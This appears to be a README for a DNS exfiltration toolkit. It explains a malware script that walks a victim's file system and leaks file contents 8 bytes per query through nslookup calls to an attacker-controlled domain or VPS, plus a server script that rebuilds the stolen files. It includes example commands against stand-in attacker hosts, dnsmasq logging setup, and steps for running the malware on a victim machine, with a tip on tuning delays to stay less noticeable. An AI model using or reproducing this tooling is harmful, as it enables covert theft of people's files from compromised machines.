# DnsExfiltration

I do not take any responsibility for your usage

**First you need to know how a DNS works and what DNS Exfiltration stands for...**

There are two scripts:
	
	1) Malware script that steal all the files from the PC that runs it
	2) DNS server script that recomposes all the victim files 


The first script goes through the file system and It "slowly" send a part of this to a malicious DNS server. I say slowly because for each DNS query this script exfiltrate 8 byte of information.

if you are authoritative for a certain domain you have to set the script in order to execute:
	
	:~$ nslookup x.payload."yourDomain"
	
	for example:
	
	:~$ nslookup x.payload.xor.com
	
	ps: "xor.com" does not exist, it is just an example

if You are not authoritative, You have just to configure a VPS like a DNS query forwarder and then set the script to make it run:

	:~$ nslookup x.payload."oneDomanin" "MaliciousVpsIP"

	for example:

	:~$ nslookup x.payload.xor.com 172.50.100.150


The payload length is more of 8 byte but It contains 8 byte of one file content + the file part number, the file part number (just like an offset) is used to recompose the file parts on the DNS:
	
	A payload may be one of these:
		0 + fileName
		1 + first 8 byte of the file
		2 + the next 8 byte of the file
		3 + again 8 byte ....

From these payloads the malicious DNS script will be able to create and fill the exfiltrated file: when the packet number is "0" it knows that it has to create a file with the name equal to "fileName", and then just append data of next packets untill a new "0" packet nukber is received 





## CONFIGURE DNS QUERY FORWARDER:
If you as me can not go to the Delegation Authority to become authoritative for a certain domain, You have to configure a VPS like a DNS query forwarder. I have used 'dnsmasq' demon, you have to configure it:
	
	Open /etc/dnsmasq.conf and append:
		log-queries
		log-facility=/tmp/dnsmasq.log
	These tells dnsmasq to save all the DNS query in a specific file that will be read by the DNS server side script





## HOW TO RUN:
1) Add your domain or the VPS IP in the "exfiltrator.py" malware script.
2) If you are authoritative configure your DNS, if you are not I suggest You to create a VPS and configure dnsmaq as I explain before.
3) Configure the right path in the "composer.py" DNS side script. You have to tell the script where It has to read all the query log. Just to be sure you have understood: Write the path You have set in the DNS configuration or dnsmasq configuration.
4) To have a try, run on the DNS server "composer.py" ( **:~$ python composer.py** ) and then run (or make it run) "exfiltrator.py" ( **:~$ python exfiltrator.py** ) script on the victim machine.
5) Wait and see 

As you can see, the malware script wait 1 second for each query and wait 1 second for each file passed through the file system. These wait are here because i tested this on my slow VPS... you can remove these waiting or keep it, it depends on how much you want be loud.

As you can see from the code, this script supports 1 attack at the same time. This script does not currently work on Windows Systems because Windows use "\\" in paths, while here i use "/" (...because i wrote and tested this on and for Linux...). So if you want to use this on windows make the correct very easy changes... lol.

